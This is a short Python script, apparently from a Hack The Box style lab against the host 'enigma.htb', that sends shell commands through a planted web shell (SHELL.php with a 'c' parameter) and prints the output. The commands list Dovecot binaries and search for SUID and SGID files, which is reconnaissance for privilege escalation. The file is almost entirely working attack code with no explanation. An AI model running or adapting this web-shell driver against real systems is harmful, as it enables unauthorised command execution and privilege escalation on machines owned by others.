import urllib.request, urllib.parse

cmds = [
    "ls -la /usr/bin/dove* 2>&1",
    "ls -la /usr/sbin/dove* 2>&1",
    "ls /usr/bin/dove* 2>&1",
    "ls /usr/sbin/dove* 2>&1",
    # Check all SUID/SGID binaries
    "find / -type f -perm -4000 2>/dev/null | head -30",
    "find / -type f -perm -2000 2>/dev/null | head -30",
    # Check Dovecot libexec directory  
    "ls -la /usr/libexec/dovecot/ 2>&1",
    "ls -la /usr/lib/dovecot/ 2>&1 | head -30",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
